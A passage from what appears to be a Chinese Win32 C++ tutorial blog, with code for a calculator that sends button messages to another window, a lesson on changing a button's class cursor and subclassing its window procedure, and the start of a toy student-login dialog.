class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10013</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;-&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10014</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;*&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10015</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;/&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;等于&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">500</span>, <span class="number">350</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10018</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wparam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1011</span>:<span class="comment">//对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1000</span>:<span class="comment">//清空                         //0x51是控件ID</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x51</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1017</span>:<span class="comment">//清空</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x53</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:<span class="comment">//数字1</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x83</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:<span class="comment">//数字2</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x84</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:<span class="comment">//数字3</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x85</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1004</span>:<span class="comment">//数字4</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x86</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1005</span>:<span class="comment">//数字5</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x87</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1006</span>:<span class="comment">//数字6</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x88</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1007</span>:<span class="comment">//数字7</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x89</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1008</span>:<span class="comment">//数字8</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8A</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1009</span>:<span class="comment">//数字9</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0011</span>:<span class="comment">//数字0</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x82</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0012</span>:<span class="comment">//小数点</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x54</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0013</span>:<span class="comment">//运算符 +</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5D</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0014</span>:<span class="comment">//运算符 - </span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5E</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0015</span>:<span class="comment">//运算符 *</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5C</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0016</span>:<span class="comment">//运算符 /</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0018</span>:<span class="comment">//运算符 =</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x79</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, msg, wparam, lparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：拦截控件消息"><a href="#题：拦截控件消息" class="headerlink" title="题：拦截控件消息"></a>题：拦截控件消息</h2><p>控件的窗口类，是系统自己注册的，所以，控件的消息处理函数，也是系统自己的。我们如果想要得到控件消息，就需要截获到控件的消息处理函数。</p><p>GetClassLong 能够获取一个已经注册的窗口的类中的属性</p><p>SetClassLong 能够设置一个窗口，对应的窗口类中的属性</p><p>示例：我们使用SetClassLong实现修改按钮的光标</p><h3 id="修改按钮的cursor属性"><a href="#修改按钮的cursor属性" class="headerlink" title="//修改按钮的cursor属性"></a>//修改按钮的cursor属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HCURSOR hCursor = <span class="built_in">LoadCursor</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1));</span><br><span class="line"><span class="built_in">SetClassLong</span>(hButton4, GCL_HCURSOR, (LONG)hCursor);</span><br></pre></td></tr></table></figure><h3 id="修改控件回调"><a href="#修改控件回调" class="headerlink" title="//修改控件回调"></a>//修改控件回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 旧的窗口回调，</span></span><br><span class="line">WNDPROC g_oldProc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">ButtonProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;你被hook了&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用默认的处理函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallWindowProc</span>(DefWindowProc, hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1001</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;hook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1002</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;unhook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1003</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;我是按钮&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line">g_oldProc =</span><br><span class="line">(WNDPROC)<span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line"><span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)g_oldProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.注册窗口类</span></span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line"><span class="comment">// 窗口回调</span></span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line"><span class="comment">// 窗口类名</span></span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;myClass&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.创建窗口</span></span><br><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(<span class="string">L&quot;myClass&quot;</span>, <span class="string">L&quot;我的窗口&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line"><span class="number">40</span>, <span class="number">40</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.建立消息循环</span></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：校园学生登录"><a href="#题：校园学生登录" class="headerlink" title="题：校园学生登录"></a>题：校园学生登录</h2><p>里面有图片控件是直接在可视化界面导入的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;comdef.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Commctrl.h&gt;</span><span class="comment">//通用控件必备头</span></span></span><br><span class="line"><span class="comment">//全局的实例句柄</span></span><br><span class="line"><span class="type">static</span> HINSTANCE g_hInstance;</span><br><span class="line"><span class="comment">//全局的父窗口句柄</span></span><br><span class="line">HWND g_hDlg;</span><br><span class="line"><span class="comment">//非模态回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE lProInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hInstance = hInstance;</span><br><span class="line">HWND hDlg=<span class="built_in">CreateDialog</span>(hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">g_hDlg = hDlg;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg,SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (Message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDOK2:<span class="comment">//登录控件</span></span><br><span class="line">&#123;</span><br><span class="line">HWND hBt = <span class="built_in">GetDlgItem</span>(hWnd, IDOK2);</span><br><span class="line"><span class="comment">//SendMessage(hBt, BM_GETCHECK,0,0);</span></span><br><span class="line"><span class="comment">//MessageBox(hBt,L&quot;无法连接服务器&quot;,L&quot;提示&quot;,1);</span></span><br><span class="line"><span class="comment">//获取文本框句柄</span></span><br><span class="line">HWND hedit_user = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT3);</span><br><span class="line">HWND hedit_passwd = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT2);</span><br><span class="line"><span class="comment">//定义文本框获取缓冲区</span></span><br><span class="line">WCHAR c_User[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">WCHAR c_Passwd[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//获取编辑框中是文本</span></span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_user, c_User,<span class="number">20</span>);</span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_passwd, c_Passwd, <span class="number">20</span>);</span><br><span class="line">WCHAR C_MAX[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//将用户名转换成char*用于使用strcmp函数的比较</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_UTemp</span><span class="params">(c_User)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_PTemp</span><span class="params">(c_Passwd)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="comment">//设置一个可以登录的用户名或密码</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* u_temp = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* p_temp = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//int i = strcmp(c_UTemp, u_temp);</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(c_UTemp, u_temp)==<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(c_PTemp, p_temp)==<span class="number">0</span>))<span class="comment">//等于0说明账户名和密码都相等，验证成功</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd,SW_HIDE);<span class="comment">//隐藏主窗口</span></span><br><span class="line"></span><br><span class="line">HWND hMain = <span class="built_in">CreateDialog</span>(g_hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG2) ,g_hDlg, DlgProc);</span><br><span class="line"><span class="comment">//初始化界面</span></span><br><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br><span class="line"><span class="comment">//2，初始化列表</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//1. 获取列表框的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | 